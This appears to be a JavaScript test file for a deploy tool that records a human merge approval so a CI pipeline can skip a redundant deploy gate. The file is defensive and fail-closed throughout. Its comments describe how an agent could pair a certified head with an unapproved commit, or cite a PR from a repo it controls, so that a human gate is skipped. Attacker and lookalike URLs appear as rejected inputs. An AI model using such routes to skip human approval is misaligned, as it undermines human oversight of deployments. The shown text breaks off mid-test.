// A ship run used to ask its human TWICE for byte-identical code: Merge Approval
// on a head SHA, then the in-pipeline deploy gate on the merge commit of that same
// head. start_deploy now RECORDS the first decision so the pipeline can decide the
// second ask is redundant — for exactly that merge commit and nothing else.
//
// Two things make that safe, and both are asserted as SHAPE rather than as an
// answer, because both failure modes are silent:
//
//  1. FAIL-CLOSED. Every path that cannot PROVE the claim writes NO record and
//     still starts the pipeline, so the worst case is the status quo (a human
//     gate), never a blocked deploy and never an unproven skip. The four
//     `preapproval.reason` values are the complete vocabulary of "no record, and
//     why", and each is pinned below together with "PutObject count === 0" and
//     "the pipeline started anyway".
//  2. The RECORD ITSELF is a cross-unit contract — the pipeline reads it. Bucket,
//     key path and every body field are asserted literally, because a renamed key
//     or a merge_commit that is not the S3 key is a feature that silently stops
//     working (the gate just keeps firing) rather than a test that fails.
//
// Recording is not approving: there is no approval token here, no CodePipeline
// approval API, and section 8.10's repo-wide guard proves it stays that way.

describe("start_deploy ship-approval record (TEAM-4525)", () => {
  // Two distinct, full 40-hex SHAs: the merge commit the pipeline will deploy, and
  // the head SHA a human approved at Merge Approval. They must never be conflated
  // — the record keys on the FORMER and attests to the LATTER.
  const MERGE = "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678";
  const HEAD = "0f1e2d3c4b5a69788796a5b4c3d2e1f001234567";
  const OTHER = "9999999999999999999999999999999999999999";
  const BUCKET = "hub-artifacts-test";
  const CI_BUILD = "agentcore-hub-ci:ci-build-uuid";
  const KEY = `pipeline-artifacts/ship-approvals/${MERGE}.json`;

  /** A CI ledger whose newest build of the PR-check project is `buildStatus` and
   * resolved to `resolved`. This is what start_deploy's verification reads. */
  function serveCiBuild({ id = CI_BUILD, buildStatus = "SUCCEEDED", resolved = HEAD, projectName } = {}) {
    h.state.listBuildsImpl = async () => ({ ids: [id] });
    h.state.batchGetBuildsImpl = async (input) => ({
      builds: (input.ids || []).map((buildId) => ({
        id: buildId,
        projectName,
        buildStatus,
        resolvedSourceVersion: resolved,
        sourceVersion: resolved,
        endTime: "2026-09-12T00:00:00Z",
      })),
    });
  }

  const PR_URL = "https://github.com/acme/thing/pull/7";

  /** GitHub's answer for the PR at PR_URL. Defaults to the HAPPY binding: merged,
   * head == the approved SHA, merge_commit_sha == the commit being deployed. Every
   * argument is an override so a test can break exactly one property. */
  function serveGithubPr({
    merged = true,
    head = HEAD,
    mergeCommit = MERGE,
    fullName = "acme/thing",
    ok = true,
    status = 200,
  } = {}) {
    h.state.githubImpl = async () => ({
      ok,
      status,
      json: async () => ({
        merged,
        head: { sha: head },
        merge_commit_sha: mergeCommit,
        base: { repo: { full_name: fullName } },
      }),
    });
  }

  /** start_deploy on a fresh module with an artifact bucket configured (the record
   * has nowhere to go without one). No registry → the env default is the only
   * target, so no pipeline_name is needed. GITHUB_TOKEN is set because recording
   * now REQUIRES a verified merge binding; tests that want the no-token path pass
   * `{ GITHUB_TOKEN: undefined }`. */
  function deploy(args, env = {}) {
    return withEnv(
      { ARTIFACT_BUCKET: BUCKET, GITHUB_TOKEN: "ghp-test-token", ...env },
      async (mod) => {
        h.state.s3Calls = [];
        h.state.s3Puts = [];
        h.state.cpCalls = [];
        h.state.cbCalls = [];
        return invokeOn(mod.handler, "start_deploy", args);
      }
    );
  }

  const started = () => h.state.cpCalls.find((c) => c.type === "StartPipelineExecution");
  const record = () => JSON.parse(h.state.s3Puts[0].input.Body);

  it("writes the record, then starts the pipeline, when CI is certified on the approved head AND GitHub confirms the merge binding", async () => {
    serveCiBuild();
    serveGithubPr();

    const out = await deploy(
      {
        commit_sha: MERGE,
        approved_head_sha: HEAD,
        pr_url: PR_URL,
        workflow_id: "wf-4525",
        ticket_id: "TEAM-4525",
      },
      // Set so `repo` has a value to carry; the env default target's repo label is
      // otherwise null and the contract omits absent optional fields.
      { PIPELINE_REPO: "acme/thing" }
    );

    // ── the contract, literally ──────────────────────────────────────────────
    expect(h.state.s3Puts).toHaveLength(1);
    expect(h.state.s3Puts[0].input).toMatchObject({
      Bucket: BUCKET,
      Key: KEY,
      ContentType: "application/json",
    });
    // The key IS the merge commit: that is how the pipeline looks the record up
    // from its own source revision, with no index and no scan.
    expect(h.state.s3Puts[0].input.Key).toBe(
      `pipeline-artifacts/ship-approvals/${MERGE}.json`
    );

    const body = record();
    expect(body).toMatchObject({
      version: 1,
      merge_commit: MERGE,
      approved_head_sha: HEAD,
      ci_build_id: CI_BUILD,
      pipeline: "agentcore-hub-deploy",
      repo: "acme/thing",
      pr_url: PR_URL,
      workflow_id: "wf-4525",
      ticket_id: "TEAM-4525",
      recorded_by: "Pipeline___start_deploy",
    });
    // The binding was verified against the PR the caller named, with the token,
    // and against GitHub's API host — not some url the caller controlled.
    expect(h.state.githubCalls).toHaveLength(1);
    expect(h.state.githubCalls[0].url).toBe(
      "https://api.github.com/repos/acme/thing/pulls/7"
    );
    expect(h.state.githubCalls[0].headers.Authorization).toBe("token ghp-test-token");
    // recorded_at is a real ISO-8601 instant, not a Date object or a local string.
    expect(body.recorded_at).toMatch(/^\d{4}-\d{2}-\d{2}T[\d:.]+Z$/);
    expect(Number.isNaN(Date.parse(body.recorded_at))).toBe(false);
    // Exactly the contract's keys — a stray field is a reader that has to guess.
    expect(Object.keys(body).sort()).toEqual([
      "approved_head_sha",
      "ci_build_id",
      "merge_commit",
      "pipeline",
      "pr_url",
      "recorded_at",
      "recorded_by",
      "repo",
      "ticket_id",
      "version",
      "workflow_id",
    ]);

    // ── and the deploy still happened, with the token derivation untouched ────
    expect(started()).toBeDefined();
    expect(started().input.clientRequestToken).toBe(`deploy-${MERGE}`);
    expect(out.started).toBe(true);
    expect(out.preapproval).toEqual({ recorded: true, key: KEY });
    // The note has to teach the agent that a record is not an approval.
    expect(out.note).toMatch(/no approval capability/i);
  });

  // pr_url is NO LONGER optional (TEAM-4525 review P1) — it is the thing that makes
  // the binding checkable — so the only omittable fields left are the labels.
  it("omits optional labels the caller did not supply, keeps the mandatory ones", async () => {
    serveCiBuild();
    serveGithubPr({ fullName: undefined });

    const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD, pr_url: PR_URL });

    const body = record();
    expect(out.preapproval.recorded).toBe(true);
    for (const absent of ["workflow_id", "ticket_id", "repo"]) {
      expect(body, absent).not.toHaveProperty(absent);
    }
    for (const present of [
      "version",
      "merge_commit",
      "approved_head_sha",
      "pr_url",
      "recorded_at",
      "recorded_by",
    ]) {
      expect(body, present).toHaveProperty(present);
    }
  });

  it("normalizes a padded/upper-case SHA pair before recording", async () => {
    serveCiBuild();
    serveGithubPr();

    const out = await deploy({
      commit_sha: `  ${MERGE.toUpperCase()} `,
      approved_head_sha: HEAD.toUpperCase(),
      pr_url: PR_URL,
    });

    // Lower-cased in BOTH the key and the body: the pipeline compares strings.
    expect(h.state.s3Puts[0].input.Key).toBe(KEY);
    expect(record()).toMatchObject({ merge_commit: MERGE, approved_head_sha: HEAD });
    expect(out.preapproval.recorded).toBe(true);
  });

  // ── reason: approved_head_sha_missing ──────────────────────────────────────

  it("records NOTHING and names approved_head_sha_missing when no approved head is passed", async () => {
    serveCiBuild();

    const out = await deploy({ commit_sha: MERGE });

    expect(out.preapproval).toEqual({
      recorded: false,
      reason: "approved_head_sha_missing",
    });
    expect(h.state.s3Puts).toEqual([]);
    // No verification either: a caller not claiming an approval costs zero
    // CodeBuild calls, so every pre-TEAM-4525 caller is byte-identical.
    expect(h.state.cbCalls).toEqual([]);
    // And the deploy went ahead — the human gate will fire, which is the point.
    expect(out.started).toBe(true);
    expect(started()).toBeDefined();
  });

  it("reports approved_head_sha_missing (not invalid_sha) for a whitespace-only value", async () => {
    const out = await deploy({ commit_sha: MERGE, approved_head_sha: "   " });

    expect(out.preapproval.reason).toBe("approved_head_sha_missing");
    expect(h.state.s3Puts).toEqual([]);
    expect(out.started).toBe(true);
  });

  // ── reason: invalid_sha ────────────────────────────────────────────────────

  it("names invalid_sha for a short or non-hex SHA on EITHER side, and records nothing", async () => {
    serveCiBuild();

    for (const args of [
      { commit_sha: MERGE, approved_head_sha: "abc123" }, // short head
      { commit_sha: MERGE, approved_head_sha: `${HEAD.slice(0, 39)}z` }, // non-hex head
      { commit_sha: "abc123def", approved_head_sha: HEAD }, // short merge commit
      { commit_sha: `${MERGE}00`, approved_head_sha: HEAD }, // over-long merge commit
      { approved_head_sha: HEAD }, // no merge commit at all
    ]) {
      const out = await deploy(args);
      const label = JSON.stringify(args);

      expect(out.preapproval, label).toEqual({ recorded: false, reason: "invalid_sha" });
      expect(h.state.s3Puts, label).toEqual([]);
      // An unusable SHA is answered from the args — no AWS lookup at all.
      expect(h.state.cbCalls, label).toEqual([]);
      expect(out.started, label).toBe(true);
      expect(started(), label).toBeDefined();
    }
  });

  // ── reason: ci_not_certified ───────────────────────────────────────────────

  it("names ci_not_certified when the approved head's newest CI build FAILED", async () => {
    serveCiBuild({ buildStatus: "FAILED" });

    const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD });

    expect(out.preapproval).toEqual({ recorded: false, reason: "ci_not_certified" });
    expect(h.state.s3Puts).toEqual([]);
    expect(out.started).toBe(true);
  });

  it("names ci_not_certified when the only green build resolved to a DIFFERENT commit", async () => {
    // The defect this prevents: "CI is green on this project" read as "CI is green
    // on the head the human approved". A green build of an older commit proves
    // nothing about this one.
    serveCiBuild({ resolved: OTHER });

    const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD });

    expect(out.preapproval).toEqual({ recorded: false, reason: "ci_not_certified" });
    expect(h.state.s3Puts).toEqual([]);
    expect(out.started).toBe(true);
  });

  it("names ci_not_certified when the project has no builds at all", async () => {
    h.state.listBuildsImpl = async () => ({ ids: [] });

    const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD });

    expect(out.preapproval.reason).toBe("ci_not_certified");
    expect(h.state.s3Puts).toEqual([]);
    expect(out.started).toBe(true);
  });

  it("treats a CodeBuild read that THREW as not-certified, and still deploys", async () => {
    h.state.listBuildsImpl = async () => {
      const err = new Error("AccessDenied");
      err.name = "AccessDeniedException";
      throw err;
    };

    const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD });

    // A failed read proves nothing, so it is the same answer as "not certified".
    expect(out.preapproval).toEqual({ recorded: false, reason: "ci_not_certified" });
    expect(h.state.s3Puts).toEqual([]);
    expect(out.started).toBe(true);
  });

  // ── ci_build_id: the precise path ──────────────────────────────────────────

  it("verifies a supplied ci_build_id by BatchGetBuilds on that ONE id", async () => {
    serveGithubPr();
    h.state.batchGetBuildsImpl = async (input) => ({
      builds: (input.ids || []).map((id) => ({
        id,
        projectName: "agentcore-hub-ci",
        buildStatus: "SUCCEEDED",
        resolvedSourceVersion: HEAD,
      })),
    });

    const out = await deploy({
      commit_sha: MERGE,
      approved_head_sha: HEAD,
      ci_build_id: CI_BUILD,
      pr_url: PR_URL,
    });

    expect(out.preapproval).toEqual({ recorded: true, key: KEY });
    expect(record().ci_build_id).toBe(CI_BUILD);
    // Straight to the build — no ListBuildsForProject ledger scan.
    expect(h.state.cbCalls.map((c) => c.type)).toEqual(["BatchGetBuilds"]);
    expect(h.state.cbCalls[0].input).toEqual({ ids: [CI_BUILD] });
  });

  it("refuses a ci_build_id that is green for a DIFFERENT project", async () => {
    // The build is SUCCEEDED and resolves to the right head, but it is a build of
    // the DEPLOY project, not the PR check — it certifies nothing about the tree.
    h.state.batchGetBuildsImpl = async (input) => ({
      builds: (input.ids || []).map((id) => ({
        id,
        projectName: "agentcore-hub-deploy",
        buildStatus: "SUCCEEDED",
        resolvedSourceVersion: HEAD,
      })),
    });

    const out = await deploy({
      commit_sha: MERGE,
      approved_head_sha: HEAD,
      ci_build_id: "agentcore-hub-deploy:some-uuid",
    });

    expect(out.preapproval).toEqual({ recorded: false, reason: "ci_not_certified" });
    expect(h.state.s3Puts).toEqual([]);
    expect(out.started).toBe(true);
  });

  it("refuses a ci_build_id that is not SUCCEEDED, or that resolves elsewhere, or that does not exist", async () => {
    for (const [label, builds] of [
      ["in progress", [{ id: CI_BUILD, projectName: "agentcore-hub-ci", buildStatus: "IN_PROGRESS", resolvedSourceVersion: HEAD }]],
      ["other commit", [{ id: CI_BUILD, projectName: "agentcore-hub-ci", buildStatus: "SUCCEEDED", resolvedSourceVersion: OTHER }]],
      ["unresolved", [{ id: CI_BUILD, projectName: "agentcore-hub-ci", buildStatus: "SUCCEEDED" }]],
      ["missing", []],
    ]) {
      h.state.batchGetBuildsImpl = async () => ({ builds });

      const out = await deploy({
        commit_sha: MERGE,
        approved_head_sha: HEAD,
        ci_build_id: CI_BUILD,
      });

      expect(out.preapproval, label).toEqual({
        recorded: false,
        reason: "ci_not_certified",
      });
      expect(h.state.s3Puts, label).toEqual([]);
      expect(out.started, label).toBe(true);
    }
  });

  // ── reason: record_write_failed ────────────────────────────────────────────

  it("names record_write_failed when PutObject throws, and still starts the pipeline", async () => {
    serveCiBuild();
    serveGithubPr();
    h.state.putObjectImpl = async () => {
      const err = new Error("AccessDenied");
      err.name = "AccessDenied";
      throw err;
    };

    const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD, pr_url: PR_URL });

    // No exception escaped: the handler returned a normal start_deploy result.
    expect(out.preapproval).toEqual({ recorded: false, reason: "record_write_failed" });
    expect(out.error).toBeUndefined();
    expect(out.started).toBe(true);
    expect(started()).toBeDefined();
    // The write was ATTEMPTED (this is not the eligibility path) and failed.
    expect(h.state.s3Puts).toHaveLength(1);
  });

  it("names record_write_failed when there is no artifact bucket to write to", async () => {
    serveCiBuild();
    serveGithubPr();

    const out = await withEnv({ ARTIFACT_BUCKET: undefined, GITHUB_TOKEN: "ghp-test-token" }, async (mod) => {
      h.state.s3Calls = [];
      h.state.s3Puts = [];
      h.state.cpCalls = [];
      return invokeOn(mod.handler, "start_deploy", {
        commit_sha: MERGE,
        approved_head_sha: HEAD,
        pr_url: PR_URL,
      });
    });

    expect(out.preapproval).toEqual({ recorded: false, reason: "record_write_failed" });
    // Never a PutObject with an empty Bucket — S3 is not called at all.
    expect(h.state.s3Calls).toEqual([]);
    expect(out.started).toBe(true);
  });

  // ── the four reasons are the WHOLE vocabulary ──────────────────────────────

  it("every reason it can emit is one of the eight documented strings", async () => {
    // The COMPLETE vocabulary. A new reason string that is not here is a reason the
    // pipeline side and the blueprints have never heard of.
    const REASONS = new Set([
      "approved_head_sha_missing",
      "invalid_sha",
      "ci_not_certified",
      "record_write_failed",
      "pr_url_missing",
      "pr_url_invalid",
      "merge_binding_mismatch",
      "merge_binding_unverified",
    ]);
    const cases = [
      ["no approved head", { commit_sha: MERGE }, () => serveCiBuild()],
      ["bad head sha", { commit_sha: MERGE, approved_head_sha: "nope" }, () => serveCiBuild()],
      [
        "ci red",
        { commit_sha: MERGE, approved_head_sha: HEAD, pr_url: PR_URL },
        () => serveCiBuild({ buildStatus: "FAILED" }),
      ],
      [
        "write fails",
        { commit_sha: MERGE, approved_head_sha: HEAD, pr_url: PR_URL },
        () => {
          serveCiBuild();
          serveGithubPr();
          h.state.putObjectImpl = async () => {
            throw new Error("boom");
          };
        },
      ],
      ["no pr_url", { commit_sha: MERGE, approved_head_sha: HEAD }, () => serveCiBuild()],
      [
        "junk pr_url",
        { commit_sha: MERGE, approved_head_sha: HEAD, pr_url: "not-a-url" },
        () => serveCiBuild(),
      ],
      [
        "pr not merged",
        { commit_sha: MERGE, approved_head_sha: HEAD, pr_url: PR_URL },
        () => {
          serveCiBuild();
          serveGithubPr({ merged: false });
        },
      ],
      [
        "github down",
        { commit_sha: MERGE, approved_head_sha: HEAD, pr_url: PR_URL },
        () => {
          serveCiBuild();
          h.state.githubImpl = async () => {
            throw new Error("ECONNRESET");
          };
        },
      ],
    ];
    for (const [label, args, arrange] of cases) {
      arrange();
      const out = await deploy(args);
      expect(out.preapproval.recorded, label).toBe(false);
      expect(REASONS.has(out.preapproval.reason), `${label}: ${out.preapproval.reason}`).toBe(
        true
      );
      expect(out.started, label).toBe(true);
    }
  });

  // ── the merge binding, machine-verified (TEAM-4525 review P1) ─────────────
  //
  // THE defect this section exists for: CI certification proves the approved HEAD
  // is green and says nothing about the commit being deployed. Both SHAs arrive
  // from the caller, so without an independent check an agent could pair a
  // genuinely certified head with ANY newer, unapproved main commit and get a
  // record written for it — the pipeline would then skip that commit's human gate.
  // The record must therefore never be written on the caller's word alone.

  it("REFUSES a certified head paired with an unapproved commit — the reviewer's repro", async () => {
    // CodeBuild genuinely certifies HEAD...
    serveCiBuild({ resolved: HEAD });
    // ...but the PR whose head that is was merged as MERGE, not as OTHER. OTHER is
    // the newer/unapproved main commit the caller is trying to get recorded.
    serveGithubPr({ head: HEAD, mergeCommit: MERGE });

    const out = await deploy({
      commit_sha: OTHER,
      approved_head_sha: HEAD,
      ci_build_id: CI_BUILD,
      pr_url: PR_URL,
    });

    expect(out.preapproval).toEqual({
      recorded: false,
      reason: "merge_binding_mismatch",
    });
    // Nothing was written, so `decide OTHER` in the Build stage finds no record and
    // the human gate fires — which is the whole point.
    expect(h.state.s3Puts).toEqual([]);
    expect(out.started).toBe(true);
  });

  it("refuses when the PR's head is not the SHA the human approved (post-approval drift)", async () => {
    serveCiBuild();
    serveGithubPr({ head: OTHER });

    const out = await deploy({
      commit_sha: MERGE,
      approved_head_sha: HEAD,
      pr_url: PR_URL,
    });

    expect(out.preapproval.reason).toBe("merge_binding_mismatch");
    expect(h.state.s3Puts).toEqual([]);
  });

  it("refuses an open (unmerged) PR — its merge commit does not exist yet", async () => {
    serveCiBuild();
    serveGithubPr({ merged: false });

    const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD, pr_url: PR_URL });

    expect(out.preapproval.reason).toBe("merge_binding_mismatch");
    expect(h.state.s3Puts).toEqual([]);
  });

  it("requires pr_url: without it there is nothing to verify the binding against", async () => {
    serveCiBuild();
    serveGithubPr();

    const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD });

    expect(out.preapproval).toEqual({ recorded: false, reason: "pr_url_missing" });
    expect(h.state.s3Puts).toEqual([]);
    // Not even asked — a missing url is refused before any network call.
    expect(h.state.githubCalls).toEqual([]);
    expect(out.started).toBe(true);
  });

  it("refuses a pr_url for a DIFFERENT repo than the target's, without calling GitHub", async () => {
    // Otherwise an agent could point at a PR in a repo it controls, whose head and
    // merge commit it chose, and have that attest to a hub deploy.
    serveCiBuild();
    serveGithubPr();

    const out = await deploy(
      {
        commit_sha: MERGE,
        approved_head_sha: HEAD,
        pr_url: "https://github.com/attacker/evil/pull/1",
      },
      { PIPELINE_REPO: "acme/thing" }
    );

    expect(out.preapproval).toEqual({ recorded: false, reason: "pr_url_invalid" });
    expect(h.state.githubCalls).toEqual([]);
    expect(h.state.s3Puts).toEqual([]);
  });

  it("refuses every pr_url that is not an exact github.com pull URL", async () => {
    serveCiBuild();
    serveGithubPr();
    for (const prUrl of [
      "not-a-url",
      "http://github.com/acme/thing/pull/7", // not https
      "https://github.com.evil.test/acme/thing/pull/7", // lookalike host
      "https://evil.test/acme/thing/pull/7",
      "https://github.com/acme/thing/pull/7?x=1", // query
      "https://github.com/acme/thing/pull/7#frag", // fragment
      "https://github.com/acme/../thing/pull/7", // traversal
      "https://github.com/acme/thing/pull/abc", // not a number
      "https://github.com/acme/thing/issues/7", // not a PR
      "https://github.com/acme/thing/pull/7/files", // trailing path
      "  ", // blank → missing, not invalid
    ]) {
      const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD, pr_url: prUrl });
      expect(out.preapproval.recorded, prUrl).toBe(false);
      expect(["pr_url_invalid", "pr_url_missing"], prUrl).toContain(
        out.preapproval.reason
      );
      expect(h.state.s3Puts, prUrl).toEqual([]);
      expect(out.started, prUrl).toBe(true);
    }
    // None of those reached GitHub: they were all refused by the parser.
    expect(h.state.githubCalls).toEqual([]);
  });

  it("accepts the api.github.com form of the same PR", async () => {
    serveCiBuild();
    serveGithubPr();

    const out = await deploy({
      commit_sha: MERGE,
      approved_head_sha: HEAD,
      pr_url: "https://api.github.com/repos/acme/thing/pulls/7",
    });

    expect(out.preapproval.recorded).toBe(true);
    expect(h.state.githubCalls[0].url).toBe(
      "https://api.github.com/repos/acme/thing/pulls/7"
    );
  });

  it("refuses when GITHUB_TOKEN is not configured — unverifiable is treated as false", async () => {
    serveCiBuild();
    serveGithubPr();

    const out = await deploy(
      { commit_sha: MERGE, approved_head_sha: HEAD, pr_url: PR_URL },
      { GITHUB_TOKEN: undefined }
    );

    expect(out.preapproval).toEqual({
      recorded: false,
      reason: "merge_binding_unverified",
    });
    // No token → no call attempted at all.
    expect(h.state.githubCalls).toEqual([]);
    expect(h.state.s3Puts).toEqual([]);
    expect(out.started).toBe(true);
  });

  it("refuses on a GitHub error, a non-2xx, or a timeout — never records on ignorance", async () => {
    for (const [label, arrange] of [
      ["throws", () => {
        h.state.githubImpl = async () => {
          throw new Error("ECONNRESET");
        };
      }],
      ["404", () => serveGithubPr({ ok: false, status: 404 })],
      ["500", () => serveGithubPr({ ok: false, status: 500 })],
      ["401", () => serveGithubPr({ ok: false, status: 401 })],
      ["timeout", () => {
        h.state.githubImpl = async () => {
          const err = new Error("The operation was aborted");
          err.name = "TimeoutError";
          throw err;
        };
      }],
      ["garbage body", () => {
        h.state.githubImpl = async () => ({ ok: true, status: 200, json: async () => null });
      }],
    ]) {
      serveCiBuild();
      arrange();

      const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD, pr_url: PR_URL });

      expect(out.preapproval, label).toEqual({
        recorded: false,
        reason: "merge_binding_unverified",
      });
      expect(h.state.s3Puts, label).toEqual([]);
      expect(out.started, label).toBe(true);
    }
  });

  it("verifies the binding AFTER CI, so an uncertified head is still ci_not_certified", async () => {
    // Ordering matters for diagnosis: the release manager reading
    // `ci_not_certified` knows to wait for CI, not to fix a URL.
    serveCiBuild({ buildStatus: "FAILED" });
    serveGithubPr();

    const out = await deploy({ commit_sha: MERGE, approved_head_sha: HEAD, pr_url: PR_URL });

    expect(out.preapproval.reason).toBe("ci_not_certified");
    expect(h.state.githubCalls).toEqual([]);
  });

  // ── the record is HUB state, even for a cross-account pipeline ─────────────

  it("writes to the HUB bucket with the ambient client for a cross-account target", async () => {
    // The CI verification reaches the FOREIGN account (that is where the project
    // lives, via the assumed role), but the record is hub state: hub bucket, hub
    // region, ambient credentials. Writing it through the target's assumed role
    // would put the pipeline's own evidence in someone else's account.
    const registry = {
      version: 1,
      repos: [
        {
          repo: "tycenjmccann/juno",
          pipeline: "hub-juno-deploy",
          region: "us-west-2",
          account: "123456789012",
          roleArn: "arn:aws:iam::123456789012:role/hub-cd-trigger-juno",
          externalId: "hub-cd-juno-secret",
        },
        { repo: "tycenjmccann/agentcore-hub", pipeline: "agentcore-hub-deploy", region: "us-east-1" },
      ],
    };
    h.state.listBuildsImpl = async () => ({ ids: ["hub-juno-ci:build-1"] });
    h.state.batchGetBuildsImpl = async (input) => ({
      builds: (input.ids || []).map((id) => ({
        id,
        projectName: "hub-juno-ci",
        buildStatus: "SUCCEEDED",
        resolvedSourceVersion: HEAD,
      })),
    });
    // The binding is verified against the TARGET's repo, not the hub's.
    serveGithubPr({ fullName: "tycenjmccann/juno" });

    const out = await withRegistry(
      registry,
      (mod) =>
        invokeOn(mod.handler, "start_deploy", {
          pipeline_name: "hub-juno-deploy",
          commit_sha: MERGE,
          approved_head_sha: HEAD,
          pr_url: "https://github.com/tycenjmccann/juno/pull/12",
        }),
      { ARTIFACT_BUCKET: BUCKET, GITHUB_TOKEN: "ghp-test-token" }
    );

    expect(out.preapproval).toEqual({ recorded: true, key: KEY });
    // CI was read in the target's region on the assumed role...
    expect(h.state.cbCalls.every((c) => c.region === "us-west-2")).toBe(true);
    expect(h.state.stsCalls.length).toBeGreaterThanOrEqual(1);
    // ...and the record went to the HUB's bucket on the hub-region S3 client.
    expect(h.state.s3Puts).toHaveLength(1);
    expect(h.state.s3Puts[0].input.Bucket).toBe(BUCKET);
    expect(h.state.s3Puts[0].region).toBe("us-east-1");
    // Provenance carries the target it was recorded for, not the env default.
    expect(record()).toMatchObject({
      pipeline: "hub-juno-deploy",
      repo: "tycenjmccann/juno",
      ci_build_id: "hub-juno-ci:build-1",
    });
  });

  it("never writes a record on a refusal — a refused start_deploy touches no S3 and no pipeline", async () => {
    const out = await withRegistry(
      MULTI_REGISTRY,
      (mod) =>
        invokeOn(mod.handler, "start_deploy", {
          commit_sha: MERGE,
          approved_head_sha: HEAD,
        }),
      { ARTIFACT_BUCKET: BUCKET }
    );

    // Two targets, no pipeline_name → the pre-existing structural refusal, which
    // must short-circuit BEFORE the record: there is no target to attest to.
    expect(out.reason).toBe("pipeline_name_required");
    expect(out.preapproval).toBeUndefined();
    expect(h.state.s3Puts).toEqual([]);
    expect(h.state.cpCalls).toEqual([]);
  });
});

// ─── 3c. get_state and a SKIPPED deploy gate (TEAM-4525) ─────────────────────

describe("get_state with a SKIPPED Approval stage (TEAM-4525)", () => {
  /** A run whose Approval stage the pipeline skipped: Source/Build/Deploy green on
   * `executionId`, Approval "Skipped". `approvalExecutionId` defaults to the SAME
   * execution (the stage execution CodePipeline records when a condition skips it);
   * the "stale id" test below passes an older one, which is the case that used to
   * make the scoped `allStagesMatch` test false forever. */
  function skippedApproval({ executionId = "NEW", approvalExecutionId = executionId } = {}) {
    return {
      stageStates: [
        {
          stageName: "Source",
          latestExecution: { status: "Succeeded", pipelineExecutionId: executionId },
          actionStates: [{ actionName: "GitHub_main", latestExecution: { status: "Succeeded" } }],
        },
        {
          stageName: "Build",
          latestExecution: { status: "Succeeded", pipelineExecutionId: executionId },
          actionStates: [{ actionName: "Build_and_gate", latestExecution: { status: "Succeeded" } }],
        },
        {
          stageName: "Approval",
          latestExecution: { status: "Skipped", pipelineExecutionId: approvalExecutionId },
          actionStates: [
            { actionName: "Approve_deploy", latestExecution: { status: "Skipped" } },
          ],
        },
        {
          stageName: "Deploy",
          latestExecution: { status: "Succeeded", pipelineExecutionId: executionId },
          actionStates: [{ actionName: "Deploy_action", latestExecution: { status: "Succeeded" } }],
        },
      ],
    };
  }

  /** The execution's own status — the authority get_state now also reads. */
  function serveExecutionStatus(status, revisionId) {
    h.state.getPipelineExecutionImpl = async () => ({
      pipelineExecution: {
        status,
        ...(revisionId ? { artifactRevisions: [{ revisionId }] } : {}),
      },
    });
  }

  it("reports approvalSkipped + terminal + succeeded, and NOT failed", async () => {
    h.state.getPipelineStateImpl = async () => skippedApproval();
    serveExecutionStatus("Succeeded");

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.approvalSkipped).toBe(true);
    // Skipped is neither Failed nor InProgress, so the run reads as a clean,
    // finished deploy — nobody is being waited on.
    expect(out.terminal).toBe(true);
    expect(out.succeeded).toBe(true);
    expect(out.failed).toBe(false);
    expect(out.matchesExecution).toBe(true);
  });

  it("is terminal from the EXECUTION status when the skipped stage kept an older id", async () => {
    // The case that made this change necessary: a stage CodePipeline never ran for
    // this execution can still show a PREVIOUS execution's id, so `allStagesMatch`
    // is false and the scoped path can never call the run terminal — a release
    // manager polls a finished deploy until it gives up. The execution's OWN status
    // is the authority, and it can only ever end a run, never resurrect one.
    h.state.getPipelineStateImpl = async () => skippedApproval({ approvalExecutionId: "OLD" });
    serveExecutionStatus("Succeeded");

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.terminal).toBe(true);
    expect(out.succeeded).toBe(true);
    expect(out.failed).toBe(false);
    // And the skip is NOT claimed: with the stage carrying another execution's id
    // there is no proof it was skipped for THIS run, and every unprovable claim
    // here resolves against the skip (fail-closed).
    expect(out.approvalSkipped).toBe(false);
  });

  it("Skipped is not a failure even when the execution status is unknown", async () => {
    h.state.getPipelineStateImpl = async () => skippedApproval();
    // No execution status at all (an older API response, or a failed read).
    h.state.getPipelineExecutionImpl = async () => ({ pipelineExecution: {} });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.approvalSkipped).toBe(true);
    // Skipped counts as neither Failed nor InProgress, so the run is not reported
    // as broken — it is simply not yet provable as terminal from the stages alone.
    expect(out.failed).toBe(false);
  });

  it("a Failed execution is never reported succeeded, even with a skipped gate", async () => {
    // The deploy itself blew up after the gate was skipped. Nothing in the scoped
    // stage list says "Failed", so `succeeded` would have been true if `terminal`
    // came from the execution status without `failed` coming with it.
    h.state.getPipelineStateImpl = async () => skippedApproval();
    serveExecutionStatus("Failed");

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.terminal).toBe(true);
    expect(out.failed).toBe(true);
    expect(out.succeeded).toBe(false);
    expect(out.approvalSkipped).toBe(true);
  });

  it("a Superseded execution is terminal and not succeeded", async () => {
    h.state.getPipelineStateImpl = async () => skippedApproval();
    serveExecutionStatus("Superseded");

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.terminal).toBe(true);
    expect(out.succeeded).toBe(false);
  });

  it("an InProgress execution stays non-terminal — the override only ever ends a run", async () => {
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Deploy",
          latestExecution: { status: "InProgress", pipelineExecutionId: "NEW" },
          actionStates: [],
        },
      ],
    });
    serveExecutionStatus("InProgress");

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.terminal).toBe(false);
    expect(out.approvalSkipped).toBe(false);
  });

  it("approvalSkipped is false while a human IS being waited on (token present, never leaked)", async () => {
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Approval",
          latestExecution: { status: "InProgress", pipelineExecutionId: "NEW" },
          actionStates: [
            {
              actionName: "Approve_deploy",
              latestExecution: { status: "InProgress", token: "super-secret-token" },
            },
          ],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.approvalSkipped).toBe(false);
